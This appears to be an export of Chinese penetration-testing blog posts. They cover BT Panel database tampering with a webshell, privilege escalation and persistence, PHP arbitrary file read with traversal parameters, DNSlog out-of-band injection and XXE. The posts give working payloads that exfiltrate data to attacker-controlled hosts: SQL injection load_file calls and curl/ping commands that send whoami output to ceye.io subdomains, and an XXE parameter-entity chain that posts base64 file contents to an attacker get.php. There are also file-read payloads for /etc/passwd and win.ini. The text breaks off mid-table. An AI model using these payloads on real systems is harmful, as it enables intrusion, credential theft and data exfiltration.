<h2 id="下载查看宝塔数据库文件"><a href="#下载查看宝塔数据库文件" class="headerlink" title="下载查看宝塔数据库文件"></a>下载查看宝塔数据库文件</h2><p>默认位置：<code>C:/BtSoft/panel/data</code><br><img src="https://qiniu.hzktester.top/tp2020112506.png" alt="image.png"><br>找到<code>users</code>表的值。密码采用了<code>MD5</code>加密<br><img src="https://qiniu.hzktester.top/tp2020112507.png" alt="image.png"><br>这里我用<code>123456</code>的<code>MD5</code>密文：<br><img src="https://qiniu.hzktester.top/tp2020112508.png" alt="image.png"><br>修改后，注意将新建的用户id改为1：<br><img src="https://qiniu.hzktester.top/tp2020112509.png" alt="image.png"><br>使用大马覆盖掉原本的<code>default.db</code>文件<br><img src="https://qiniu.hzktester.top/tp2020112510.png" alt="image.png"><br>使用<code>test</code>，<code>123456</code>登录成功<br><img src="https://qiniu.hzktester.top/tp2020112511.png" alt="image.png"><br><img src="https://qiniu.hzktester.top/tp2020112512.png" alt="image.png"><br>之后把<code>default.db</code>文件改回原来的重新覆盖即可</p>
<h1 id="getshell之后寻找mysql密码"><a href="#getshell之后寻找mysql密码" class="headerlink" title="getshell之后寻找mysql密码"></a>getshell之后寻找mysql密码</h1><h2 id="安装dedecms"><a href="#安装dedecms" class="headerlink" title="安装dedecms"></a>安装dedecms</h2><p><img src="https://qiniu.hzktester.top/tp2020112513.png" alt="image.png"><br>利用大马找到密码：<br><img src="https://qiniu.hzktester.top/tp2020112514.png" alt="image.png"></p>
]]></content>
      <categories>
        <category>内网渗透</category>
      </categories>
      <tags>
        <tag>提权</tag>
      </tags>
  </entry>
  <entry>
    <title>内网权限基础</title>
    <url>/posts/50d3edd2.html</url>
    <content><![CDATA[<h1 id="权限划分"><a href="#权限划分" class="headerlink" title="权限划分"></a>权限划分</h1><h2 id="Windwos权限"><a href="#Windwos权限" class="headerlink" title="Windwos权限"></a>Windwos权限</h2><ul>
<li><code>SYSTEM</code>：系统权限</li>
<li><code>Administrator</code>：管理员权限</li>
<li><code>User</code>：普通用户权限</li>
</ul>
<h2 id="Linux权限"><a href="#Linux权限" class="headerlink" title="Linux权限"></a>Linux权限</h2><ul>
<li><code>root</code>：最高权限</li>
<li><code>user</code>：普通用户权限</li>
</ul>
<h2 id="shell权限"><a href="#shell权限" class="headerlink" title="shell权限"></a>shell权限</h2><p><code>shell</code>权限是由当前执行该服务（进程）的用户的权限决定的</p>
<h1 id="权限维持"><a href="#权限维持" class="headerlink" title="权限维持"></a>权限维持</h1><h2 id="windows系统"><a href="#windows系统" class="headerlink" title="windows系统"></a>windows系统</h2><h3 id="启动项维持"><a href="#启动项维持" class="headerlink" title="启动项维持"></a>启动项维持</h3><ul>
<li>用户启动项：<code>C:\Users\用户名\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup</code></li>
<li>公共启动项：<code>C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp</code></li>
</ul>
<h1 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h1><h2 id="windwos系统"><a href="#windwos系统" class="headerlink" title="windwos系统"></a>windwos系统</h2><p>当拿到<code>getshell</code>之后，是<code>user</code>权限</p>
<ul>
<li>上传具有诱惑性的木马文件等管理员打开</li>
<li>数据库执行命令</li>
<li>上传phpinfo查看未被禁止的命令函数</li>
<li>查看容器是否可以解析其他脚本</li>
</ul>
<h2 id="数据库提权"><a href="#数据库提权" class="headerlink" title="数据库提权"></a>数据库提权</h2><ul>
<li>MYSQL</li>
<li>SQL server</li>
</ul>
<h1 id="拿到shell之后的操作"><a href="#拿到shell之后的操作" class="headerlink" title="拿到shell之后的操作"></a>拿到shell之后的操作</h1><p>查看操作系统、权限、是否可以执行命令、是否允许跨目录、容器</p>
<h2 id="查看是否可以执行命令："><a href="#查看是否可以执行命令：" class="headerlink" title="查看是否可以执行命令："></a>查看是否可以执行命令：</h2><ul>
<li><code>phpinfo()</code>：disable_functions</li>
</ul>
]]></content>
      <categories>
        <category>内网渗透</category>
      </categories>
      <tags>
        <tag>提权</tag>
      </tags>
  </entry>
  <entry>
    <title>PHP-任意文件读取/下载漏洞</title>
    <url>/posts/53895abe.html</url>
    <content><![CDATA[<h1 id="危害说明"><a href="#危害说明" class="headerlink" title="危害说明"></a>危害说明</h1><p>下载服务器任意文件，例如脚本代码、系统配置文件、等等可用的代码进行代码审计或是获取系统<code>ssh</code>进行登录、获取数据库账号密码进行连接等等</p>
<h1 id="任意文件读取-利用与代码"><a href="#任意文件读取-利用与代码" class="headerlink" title="任意文件读取-利用与代码"></a>任意文件读取-利用与代码</h1><h2 id="例子一：读取文件"><a href="#例子一：读取文件" class="headerlink" title="例子一：读取文件"></a>例子一：读取文件</h2><h3 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    $filename = $_GET[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    readfile($filename);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    $filename = $_GET[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    $fp = fopen($filename,<span class="string">&quot;r&quot;</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&quot;Unable to open file!&quot;</span>);</span><br><span class="line">    $data = fread($fp,filesize($filename));</span><br><span class="line">    fclose($fp);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> $data;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    $filename = $_GET[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="keyword">echo</span> file_get_contents($filename);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<h3 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h3><p>把以上三个文件分别上传到我自己的服务器：<br><img src="https://qiniu.hzktester.top/tp2020112012.png" alt="image.png"><br>分别访问三个测试代码读取<code>1.txt</code>文件</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">curl http://test.hzktester.top/upload/read1.php?file=./1.txt</span><br><span class="line">curl http://test.hzktester.top/upload/read2.php?file=./1.txt</span><br><span class="line">curl http://test.hzktester.top/upload/read3.php?file=./1.txt</span><br></pre></td></tr></table></figure>
<p>我这里直接用<code>curl</code>命令访问进行测试<br><img src="https://qiniu.hzktester.top/tp2020112013.png" alt="tp2020112013.png"></p>
<h3 id="危险函数"><a href="#危险函数" class="headerlink" title="危险函数"></a>危险函数</h3><ul>
<li><code>readfile()</code>：读取文件并写入到输出缓冲。</li>
<li><code>fopen()</code>、<code>fread()</code>、<code>fclose()</code>：打开文件，输出文件，关闭文件。</li>
<li><code>file_get_contents()</code>：将整个文件读入一个字符串。<h2 id="例子二：复制文件"><a href="#例子二：复制文件" class="headerlink" title="例子二：复制文件"></a>例子二：复制文件</h2><h3 id="代码："><a href="#代码：" class="headerlink" title="代码："></a>代码：</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    $filename = $_GET[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    copy($filename, <span class="string">&#x27;xxx.txt&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<h3 id="利用："><a href="#利用：" class="headerlink" title="利用："></a>利用：</h3>上传测试代码后，访问：<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">curl http://test.hzktester.top/upload/read.php?file=./1.txt</span><br></pre></td></tr></table></figure>
访问后，<code>copy()</code>函数会在同目录复制<code>1.txt</code>文件的内容为<code>xxx.txt</code>文件。<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">C:\Users\86136&gt;curl http://test.hzktester.top/upload/xxx.txt</span><br><span class="line">我是被读取的文件</span><br></pre></td></tr></table></figure>
然后打开刚刚复制的<code>xxx.txt</code>文件<h1 id="任意文件下载-利用与代码"><a href="#任意文件下载-利用与代码" class="headerlink" title="任意文件下载-利用与代码"></a>任意文件下载-利用与代码</h1><h2 id="利用代码"><a href="#利用代码" class="headerlink" title="利用代码"></a>利用代码</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    <span class="variable">$filename</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    header(<span class="string">&quot;Content-type:application/octet-stream&quot;</span>);</span><br><span class="line">    header(<span class="string">&quot;Content-Disposition:attachment;filename=&quot;</span> . <span class="variable">$filename</span>);</span><br><span class="line">    header(<span class="string">&quot;Accept-ranges:bytes&quot;</span>);</span><br><span class="line">    header(<span class="string">&quot;Accept-length:&quot;</span>.filesize(<span class="variable">$filename</span>));</span><br><span class="line">    readfile(<span class="variable">$filename</span>);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<h2 id="利用-1"><a href="#利用-1" class="headerlink" title="利用"></a>利用</h2>还是先把测试代码上传到服务器，名字为<code>upload.php</code>。下载<code>1.txt</code>文件<br><img src="https://qiniu.hzktester.top/tp2020112014.png" alt="tp2020112014.png"><h1 id="漏洞挖掘思路："><a href="#漏洞挖掘思路：" class="headerlink" title="漏洞挖掘思路："></a>漏洞挖掘思路：</h1>多多关注一些参数如下:<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">download.php?path=./../etc/passwd</span><br><span class="line"></span><br><span class="line">download.php?Path=</span><br><span class="line">download.php?path=</span><br><span class="line">download.php?RealPath=</span><br><span class="line">download.php?FilePath=</span><br><span class="line">download.php?ﬁlepath=</span><br><span class="line">download.php?inputFile=</span><br><span class="line">download.php?url=</span><br><span class="line">download.php?urls=</span><br><span class="line">download.php?dir=</span><br><span class="line">download.php?data=</span><br><span class="line">download.php?<span class="built_in">read</span>ﬁle=</span><br><span class="line">download.php?src=</span><br><span class="line"></span><br><span class="line">等等....</span><br></pre></td></tr></table></figure>
<h1 id="危险函数-1"><a href="#危险函数-1" class="headerlink" title="危险函数"></a>危险函数</h1>代码审计直接搜这些函数看有没有过滤不严谨<h2 id="读取文件"><a href="#读取文件" class="headerlink" title="读取文件"></a>读取文件</h2></li>
<li><code>readfile()</code>：读取文件并写入到输出缓冲。</li>
<li><code>fopen()</code>、<code>fread()</code>、<code>fclose()</code>：打开文件，输出文件，关闭文件。</li>
<li><code>file_get_contents()</code>：将整个文件读入一个字符串。</li>
</ul>
<h2 id="复制文件"><a href="#复制文件" class="headerlink" title="复制文件"></a>复制文件</h2><ul>
<li><code>copy()</code>：拷贝文件。</li>
</ul>
<h2 id="下载文件"><a href="#下载文件" class="headerlink" title="下载文件"></a>下载文件</h2><ul>
<li><code>head()</code>函数中的<code>Content-Disposition</code>：强制浏览器下载文件。</li>
</ul>
]]></content>
      <categories>
        <category>Web渗透</category>
      </categories>
      <tags>
        <tag>任意文件读取下载</tag>
      </tags>
  </entry>
  <entry>
    <title>巧用DNSlog实现无回显注入</title>
    <url>/posts/b6cdb199.html</url>
    <content><![CDATA[<h1 id="DNSlog回显原理"><a href="#DNSlog回显原理" class="headerlink" title="DNSlog回显原理"></a>DNSlog回显原理</h1><p>首先需要有一个可以配置的域名，比如：<code>ceye.io</code>，然后通过代理商设置域名 <code>ceye.io</code> 的 <code>nameserver</code> 为自己的服务器 A，然后再服务器 A 上配置好 <code>DNS Server</code>，这样以来所有 <code>ceye.io</code> 及其子域名的查询都会到服务器 A 上，这时就能够实时地监控域名查询请求了，图示如下。<br><img src="https://qiniu.hzktester.top/tp2020112001.png" alt="tp2020112001.png"></p>
<blockquote>
<p>DNS在解析的时候会留下日志，这个就是读取多级域名的解析日志，来获取信息<br>简单来说就是把信息放在高级域名中，传递到自己这，然后读取日志，获取信息</p>
</blockquote>
<h1 id="利用场景"><a href="#利用场景" class="headerlink" title="利用场景"></a>利用场景</h1><p>在<code>sql</code>注入时为布尔盲注、时间盲注，注入的效率低且线程高容易被<code>waf</code>拦截，又或者是目标站点没有回显，我们在读取文件、执行命令注入等操作时无法明显的确认是否利用成功，这时候就要用到我们的<code>DNSlog</code>注入。</p>
<h1 id="推荐平台"><a href="#推荐平台" class="headerlink" title="推荐平台"></a>推荐平台</h1><ul>
<li><a href="http://www.dnslog.cn/">http://www.dnslog.cn</a></li>
<li><a href="http://admin.dnslog.link/">http://admin.dnslog.link</a></li>
<li><a href="http://ceye.io/">http://ceye.io</a></li>
</ul>
<p>以下利用，我这里使用<code>ceye</code>平台演示。<br><img src="https://qiniu.hzktester.top/tp2020112002.png" alt="image.png"><br>他会给你一个三级域名，你把信息写在第四级域名上就好了，比如我这里访问hzktester.xxxx.cece.io ，访问之后就会有查询记录。<br><img src="https://qiniu.hzktester.top/tp2020112003.png" alt="tp2020112003.png"><br><img src="https://qiniu.hzktester.top/tp2020112004.png" alt="image.png"></p>
<h2 id="利用一：SQL注入"><a href="#利用一：SQL注入" class="headerlink" title="利用一：SQL注入"></a>利用一：SQL注入</h2><h3 id="利用场景："><a href="#利用场景：" class="headerlink" title="利用场景："></a>利用场景：</h3><p>不论是<code>bool</code>型盲注还是时间型盲注，都需要频繁的跑请求才能够获取数据库中的值，在现代<code>WAF</code>的防护下，很可能导致IP被<code>ban</code>。</p>
<p>这个时候我们可以结合<code>DNSLOG</code>完美快速的将数据取出。如遇到<code>MySql</code>的盲注时，可以利用内置函数<code>load_file()</code>来完成<code>DNSLOG</code>。<code>load_file()</code>不仅能够加载本地文件，同时也能对诸如\<a href="http://www.test.com/">www.test.com</a>这样的<code>URL</code>发起请求。</p>
<h3 id="利用前提"><a href="#利用前提" class="headerlink" title="利用前提"></a>利用前提</h3><p><code>load_file()</code>需要设置<code>secure_file_priv</code>的值，可以参考这篇文章，这里就不赘述了。<a href="https://hzktester.top/posts/d83e4025.html">链接</a></p>
<h3 id="sql-labs靶场复现"><a href="#sql-labs靶场复现" class="headerlink" title="sql-labs靶场复现"></a>sql-labs靶场复现</h3><p>在<code>mysql</code>命令行执行：<code>select load_file(&#39;\\\\afanti.xxxx.ceye.io\\aaa&#39;);</code>其中<code>afanti</code>就是要注入的查询语句</p>
<p><code>payload</code>：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">&#x27; and if((select load_file(concat(&#x27;\\\\&#x27;,(select database()),&#x27;.xxxxx.ceye.io\\aaa&#x27;))),1,0)--+</span><br></pre></td></tr></table></figure>
<p><img src="https://qiniu.hzktester.top/tp2020112005.png" alt="tp2020112005.png"><br>查看平台，<code>dnsLog</code>被记录下来。<br><img src="https://qiniu.hzktester.top/tp2020112006.png" alt="image.png"><br>ps：稍微解释一下这个语句，这里使用<code>concat</code>函数将<code>(select database())</code>得到的内容作为查询<code>url</code>的一部分，和我们的平台三级域名拼接组合成一个四级域名，而<code>load_file</code>函数会通过<code>dns</code>解析请求，所以我们在<code>dnslog</code>平台就可以看到查询的记录(<strong>包含着我们注入出的数据</strong>)</p>
<p>对于表段，由于<code>load_file()</code>一次只能传输一条数据，所以查询的时候需要使用<code>limit</code>来一个一个的解析。</p>
<h2 id="利用二：XSS盲打"><a href="#利用二：XSS盲打" class="headerlink" title="利用二：XSS盲打"></a>利用二：XSS盲打</h2><h3 id="利用场景-1"><a href="#利用场景-1" class="headerlink" title="利用场景"></a>利用场景</h3><p>通过盲打，让触发者浏览器访问预设至的链接地址，如果盲打成功，会在平台上收到如下的链接访问记录：</p>
<h3 id="payload："><a href="#payload：" class="headerlink" title="payload："></a>payload：</h3><p><code>&lt;img src=http://xss.xxxx.ceye.io/aaa&gt;</code>：让<code>src</code>请求自己的<code>dnslog</code>平台<br><img src="https://qiniu.hzktester.top/tp2020112007.png" alt="tp2020112007.png"></p>
<h2 id="利用三：命令执行无回显"><a href="#利用三：命令执行无回显" class="headerlink" title="利用三：命令执行无回显"></a>利用三：命令执行无回显</h2><h3 id="利用场景-2"><a href="#利用场景-2" class="headerlink" title="利用场景"></a>利用场景</h3><p>针对不回显的命令注入漏洞，我们很难确定漏洞的存在并进一步利用，针对这种情况，我们可以利用<code>DNSLOG</code>来获取命令的执行结果。</p>
<h3 id="linux："><a href="#linux：" class="headerlink" title="linux："></a>linux：</h3><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">curl http://haha.xxx.ceye.io/`whoami`</span><br><span class="line">ping `whoami`.haha.xxx.ceye.io</span><br></pre></td></tr></table></figure>
<p><img src="https://qiniu.hzktester.top/tp2020112008.png" alt="tp2020112008.png"><br><img src="https://qiniu.hzktester.top/tp2020112009.png" alt="image.png"></p>
<h3 id="windows"><a href="#windows" class="headerlink" title="windows"></a>windows</h3><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">ping %USERNAME%.xxx.ceye.io</span><br></pre></td></tr></table></figure>
<p><img src="https://qiniu.hzktester.top/tp2020112010.png" alt="tp2020112010.png"><br><img src="https://qiniu.hzktester.top/tp2020112011.png" alt="image.png"><br>这里的<code>%username%</code>为用户变量</p>
<h2 id="利用四：SSRF"><a href="#利用四：SSRF" class="headerlink" title="利用四：SSRF"></a>利用四：SSRF</h2><p>这个没什么好说的，直接上<code>payload</code>，我们直接将<code>ssrf</code>中地址换成我们的<code>dnslog</code>平台<br>比如原本我们利用的是<code>url=127.0.0.1:8080</code><br>利用<code>dnslog</code>就换成 <code>url=xxx.cece.io</code><br>然后看我们的<code>dnslog</code>平台是否有服务器的<code>IP</code>来判断。</p>
<h2 id="利用五：XXE"><a href="#利用五：XXE" class="headerlink" title="利用五：XXE"></a>利用五：XXE</h2><h3 id="利用场景：-1"><a href="#利用场景：-1" class="headerlink" title="利用场景："></a>利用场景：</h3><p>当我们遇到<code>XXE</code>，如果这个<code>XXE</code>漏洞可以解析外部实体，那么不用说，就可以拿来读取本地服务器文件，这时，我们只需把文件改成这样：</p>
<h3 id="payload：-1"><a href="#payload：-1" class="headerlink" title="payload："></a>payload：</h3><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">root</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">remote</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;http://ip.port.xxxx.ceye.io/xxe_test&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">%remote;]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>/&gt;</span></span><br></pre></td></tr></table></figure>


]]></content>
      <categories>
        <category>Web渗透</category>
      </categories>
      <tags>
        <tag>DNSlog</tag>
      </tags>
  </entry>
  <entry>
    <title>XXE漏洞总结</title>
    <url>/posts/1a711be2.html</url>
    <content><![CDATA[<h1 id="XXE危害说明"><a href="#XXE危害说明" class="headerlink" title="XXE危害说明"></a>XXE危害说明</h1><p><code>XXE</code>就是<code>XML</code>外部实体注入。</p>
<p>由于服务端未对提交的<code>xml</code>的数据中引入外部实体做必要的处理，而在外部实体中引入<code>php</code>伪协议从而造成的攻击。</p>
<p>当允许引用外部实体时，通过构造恶意内容，可导致</p>
<ul>
<li>读取任意文件</li>
<li>探测内网端口</li>
<li>攻击内网网站</li>
<li>执行系统命令</li>
</ul>
<h1 id="漏洞环境说明"><a href="#漏洞环境说明" class="headerlink" title="漏洞环境说明"></a>漏洞环境说明</h1><h2 id="PHP环境低于5-5使用此代码测试"><a href="#PHP环境低于5-5使用此代码测试" class="headerlink" title="PHP环境低于5.5使用此代码测试"></a>PHP环境低于5.5使用此代码测试</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="variable">$data</span> = file_get_contents(<span class="string">&#x27;php://input&#x27;</span>);</span><br><span class="line"><span class="variable">$xml</span> = simplexml_load_string(<span class="variable">$data</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment"># 不需要回显时 注释print($xml);</span></span><br><span class="line"><span class="built_in">print</span>(<span class="variable">$xml</span>);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<h2 id="PHP环境大于等于5-5使用此代码测试"><a href="#PHP环境大于等于5-5使用此代码测试" class="headerlink" title="PHP环境大于等于5.5使用此代码测试"></a>PHP环境大于等于5.5使用此代码测试</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="variable">$data</span> = file_get_contents(<span class="string">&#x27;php://input&#x27;</span>);</span><br><span class="line"><span class="variable">$xml</span> = simplexml_load_string(<span class="variable">$data</span>, <span class="string">&#x27;SimpleXMLElement&#x27;</span>, LIBXML_NOENT);</span><br><span class="line"></span><br><span class="line"><span class="comment"># 不需要回显时 注释print($xml);</span></span><br><span class="line"><span class="built_in">print</span>(<span class="variable">$xml</span>);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1><p>注意点: 利用<code>xxe</code>读取的数据返回不能有<code>html</code>元素不然会报错</p>
<h2 id="读取文件"><a href="#读取文件" class="headerlink" title="读取文件"></a>读取文件</h2><h3 id="有回显"><a href="#有回显" class="headerlink" title="有回显"></a>有回显</h3><p>利用各种协议可以读取文件，比如<code>file://</code>，<code>php://filter</code></p>
<h4 id="windwos读取文件"><a href="#windwos读取文件" class="headerlink" title="windwos读取文件"></a>windwos读取文件</h4><p>使用<code>file://</code>协议：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span> ?&gt;</span><br><span class="line">&lt;!DOCTYPE ANY [</span><br><span class="line">&lt;!ENTITY xxe SYSTEM <span class="string">&quot;file:///C:/Windows/win.ini&quot;</span> &gt;]&gt;        </span><br><span class="line">&lt;value&gt;&amp;xxe;&lt;/value&gt;</span><br></pre></td></tr></table></figure>
<p><img src="https://qiniu.hzktester.top/tp2020111901.png" alt="tp2020111901.png"><br>使用<code>php://filter</code>协议：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;utf-8&quot;</span>?&gt;</span><br><span class="line">&lt;!DOCTYPE root [&lt;!ENTITY  file SYSTEM <span class="string">&quot;php://filter/read=convert.base64-encode/resource=C:/Windows/win.ini&quot;</span>&gt;]&gt;</span><br><span class="line">&lt;root&gt;&amp;file;&lt;/root&gt;</span><br></pre></td></tr></table></figure>
<p><img src="https://qiniu.hzktester.top/tp2020111902.png" alt="tp2020111902.png"></p>
<h4 id="linux读取文件"><a href="#linux读取文件" class="headerlink" title="linux读取文件"></a>linux读取文件</h4><p>使用<code>file://</code>协议：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; ?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">ANY</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="meta-keyword">xxe</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;file:///etc/passwd&quot;</span> &gt;</span>]&gt;</span>        </span><br><span class="line"><span class="tag">&lt;<span class="name">value</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>使用<code>php://filter</code>协议：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">root</span> [<span class="meta">&lt;!ENTITY  <span class="meta-keyword">file</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;php://filter/read=convert.base64-encode/resource=/etc/passwd&quot;</span>&gt;</span>]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span><span class="symbol">&amp;file;</span><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h3 id="无回显"><a href="#无回显" class="headerlink" title="无回显"></a>无回显</h3><p>无回显的的话则需要将文件读取的内容发送到我们的远程服务器上。</p>
<p>模拟场景：</p>
<table>
<thead>
<tr>
<th>服务器</th>
<th>域名</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>攻击机</td>
<td><a href="http://test.hzktester.top/XXE/">http://test.hzktester.top/XXE/</a></td>
<td>远程服务器</td>
</tr>
<tr>
<td>受害机</td>
<td><a href="http://192.168.3.13/XXE/">http://192.168.3.13/XXE/</a></td>
<td>本地搭建</td>
</tr>
</tbody></table>
<ol>
<li><p>在攻击机建立<code>php</code>文件接收数据</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">// 文件名称：get.php</span><br><span class="line"><span class="tag">&lt;<span class="name">?php</span></span></span><br><span class="line"><span class="tag"><span class="attr">file_put_contents</span>(&#x27;<span class="attr">xxe_data.txt</span>&#x27;, $<span class="attr">_GET</span>[&#x27;<span class="attr">xxe_local</span>&#x27;]);</span></span><br><span class="line"><span class="tag">?&gt;</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>在攻击机建立<code>xml</code>文件给用于给受害机引入 </p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">// 文件名称：1.xml</span><br><span class="line"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">data</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;php://filter/convert.base64-encode/resource=C:/Windows/win.ini&quot;</span>&gt;</span></span><br><span class="line"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">param1</span> <span class="meta-string">&quot;&lt;!ENTITY exfil SYSTEM &#x27;http://test.hzktester.top/XXE/get.php?xxe_local=%data;&#x27;&gt;&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>在受害机上执行<code>payload</code>：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; ?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE r [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT r <span class="meta-keyword">ANY</span> &gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">sp</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;http://test.hzktester.top/XXE/1.xml&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">%sp;</span></span><br><span class="line"><span class="meta">%param1;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">r</span>&gt;</span><span class="symbol">&amp;exfil;</span><span class="tag">&lt;/<span class="name">r</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p><img src="https://qiniu.hzktester.top/tp2020111903.png" alt="tp2020111903.png"></p>
</li>
<li><p>执行完以后会把数据<code>base64</code>回传给<code>get.php</code>  。<code>get.php</code>会创建一个<code>xxe_data.txt</code>文件并且写入数据</p>
</li>
</ol>
<p><img src="https://qiniu.hzktester.top/tp2020111904.png" alt="image.png"></p>
<h2 id="探测内网"><a href="#探测内网" class="headerlink" title="探测内网"></a>探测内网</h2><p>修改<a href="http://127.0.0.1/"><code>http://127.0.0.1:80</code></a> 为任意地址端口</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span> </span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">xxe</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="meta-keyword">name</span> <span class="meta-keyword">ANY</span> &gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="meta-keyword">xxe</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;http://127.0.0.1:80&quot;</span> &gt;</span>]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">name</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>运行以后<br>如果访问的端口是打开的,那么他返回就会很快<br>如果返回很慢,就说明端口没开<br><img src="https://qiniu.hzktester.top/tp2020111905.png" alt="image.png"><br>这里页面显示报错了，使用返回的数据是<code>html</code></p>
<h2 id="攻击内网网站"><a href="#攻击内网网站" class="headerlink" title="攻击内网网站"></a>攻击内网网站</h2><p>例如：<a href="http://127.0.0.1/sqli-labs/Less-1/?id=1">http://127.0.0.1/sqli-labs/Less-1/?id=1</a>现在有<code>sql</code>注入<br>为了解决返回有<code>html</code>会爆错的问题,我们可以把数据<code>base64</code>发送到我们服务器进行查看</p>
<table>
<thead>
<tr>
<th>服务器</th>
<th>域名</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>攻击机</td>
<td><a href="http://test.hzktester.top/XXE/">http://test.hzktester.top/XXE/</a></td>
<td>远程服务器</td>
</tr>
<tr>
<td>受害机</td>
